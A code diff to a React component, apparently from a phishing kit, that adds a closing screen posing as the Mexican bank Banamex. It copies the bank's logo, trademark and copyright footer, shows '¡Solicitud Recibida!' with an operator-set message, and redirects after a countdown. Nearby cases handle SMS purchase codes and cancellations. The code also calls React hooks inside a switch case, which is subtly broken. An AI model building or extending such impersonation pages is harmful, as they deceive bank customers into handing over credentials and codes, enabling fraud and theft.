@@ -1786,23 +1786,138 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(cancelacionContent);
 
       case ScreenType.MENSAJE:
+        const [currentTime4, setCurrentTime4] = useState(new Date());
+        const [redirectCounter, setRedirectCounter] = useState(5);
+
+        useEffect(() => {
+          const timer = setInterval(() => setCurrentTime4(new Date()), 1000);
+          return () => clearInterval(timer);
+        }, []);
+
+        useEffect(() => {
+          const countdown = setInterval(() => {
+            setRedirectCounter(prev => {
+              if (prev <= 1) {
+                clearInterval(countdown);
+                window.location.href = '/';
+                return 0;
+              }
+              return prev - 1;
+            });
+          }, 1000);
+          return () => clearInterval(countdown);
+        }, []);
+
+        const formatDateTime4 = (d: Date) => {
+          const days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
+          const months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
+          const pad = (n: number) => n < 10 ? '0'+n : n;
+          const dayName = days[d.getDay()];
+          const day = d.getDate();
+          const month = months[d.getMonth()];
+          const year = d.getFullYear();
+          const time = pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
+          return `${dayName} ${day} de ${month} de ${year}, ${time} Centro de México`;
+        };
+
         const mensajeContent = (
-          <>
-            <h2 className="text-xl font-bold mb-3">Mensaje del banco</h2>
-            <div className="p-4 bg-gray-100 rounded mb-4 text-left max-h-[60vh] overflow-y-auto">
-              <div className="whitespace-pre-wrap break-words">
-                {screenData.mensaje || "Mensaje personalizado del banco."}
+          <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
+            <div style={{ maxWidth: '900px', margin: '18px auto', flex: 1, display: 'flex', flexDirection: 'column' }}>
+              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '32px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                  <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Banamex logo">
+                    <g fill="#c81f3b">
+                      <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
+                      <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                      <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                    </g>
+                  </svg>
+                  <div>
+                    <div style={{ fontSize: '20px', fontWeight: 600, color: '#153e46' }}>Banamex</div>
+                  </div>
+                </div>
+
+                <div style={{ marginLeft: 'auto', textAlign: 'right' }}>
+                  <div style={{ fontSize: '14px', color: '#2d4b51' }}>
+                    {formatDateTime4(currentTime4)}
+                  </div>
+                </div>
+              </header>
+
+              <div style={{ 
+                flex: 1,
+                background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)', 
+                borderRadius: '8px', 
+                padding: '48px 32px', 
+                boxShadow: '0 6px 18px rgba(0,0,0,0.08)', 
+                border: '1px solid rgba(0,0,0,0.03)',
+                display: 'flex',
+                flexDirection: 'column',
+                alignItems: 'center',
+                justifyContent: 'center'
+              }} role="main">
+                <div style={{ textAlign: 'center', maxWidth: '600px' }}>
+                  <div style={{ 
+                    width: '80px', 
+                    height: '80px', 
+                    background: '#d4eaec', 
+                    borderRadius: '50%', 
+                    display: 'flex', 
+                    alignItems: 'center', 
+                    justifyContent: 'center',
+                    margin: '0 auto 24px'
+                  }}>
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                      <path d="M20 6L9 17L4 12" stroke="#153e46" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
+                    </svg>
+                  </div>
+
+                  <h1 style={{ fontSize: '32px', fontWeight: 600, color: '#153e46', marginBottom: '16px' }}>
+                    ¡Solicitud Recibida!
+                  </h1>
+                  
+                  <p style={{ fontSize: '18px', color: '#3d5559', lineHeight: 1.6, marginBottom: '32px' }}>
+                    {screenData.mensaje || "En breve un ejecutivo se pondrá en contacto contigo"}
+                  </p>
+
+                  <div style={{ 
+                    background: '#fff', 
+                    borderRadius: '8px', 
+                    padding: '20px', 
+                    marginBottom: '32px',
+                    boxShadow: '0 2px 8px rgba(0,0,0,0.06)'
+                  }}>
+                    <p style={{ fontSize: '14px', color: '#666', margin: 0 }}>
+                      Serás redirigido a la página principal en <strong style={{ color: '#153e46' }}>{redirectCounter}</strong> segundos
+                    </p>
+                  </div>
+
+                  <button 
+                    onClick={() => window.location.href = '/'}
+                    style={{ 
+                      padding: '14px 32px', 
+                      background: '#153e46', 
+                      color: '#fff', 
+                      border: 'none', 
+                      borderRadius: '6px', 
+                      fontSize: '16px', 
+                      fontWeight: 600, 
+                      cursor: 'pointer' 
+                    }}
+                  >
+                    Ir a página principal
+                  </button>
+                </div>
               </div>
+
+              <footer style={{ marginTop: '28px', paddingTop: '18px', borderTop: '1px solid #e0e0e0', textAlign: 'center', fontSize: '11px', color: '#666' }}>
+                <p style={{ margin: '4px 0' }}>Banamex es una marca registrada de Citigroup Inc. utilizada bajo licencia por Banco Nacional de México, S.A.</p>
+                <p style={{ margin: '4px 0' }}>© 2025 Banco Nacional de México, S.A. Derechos Reservados</p>
+              </footer>
             </div>
-            <Button 
-              className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.MENSAJE, { leido: true })}
-            >
-              Entendido
-            </Button>
-          </>
+          </div>
         );
-        return getBankContainer(mensajeContent);
+        return mensajeContent;
 
       case ScreenType.SMS_COMPRA:
       case 'sms_compra' as ScreenType:
